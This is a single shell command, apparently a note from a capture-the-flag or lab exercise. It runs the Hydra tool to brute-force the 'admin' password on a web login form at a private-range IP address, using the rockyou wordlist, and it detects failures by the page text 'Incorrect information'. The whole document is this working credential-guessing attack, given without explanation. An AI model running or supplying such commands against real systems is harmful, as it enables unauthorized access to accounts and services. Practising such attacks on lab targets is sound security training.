```
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.129.233.134 http-post-form "/login.php:username=admin&password=^PASS^&Submit=Login:Incorrect information"
```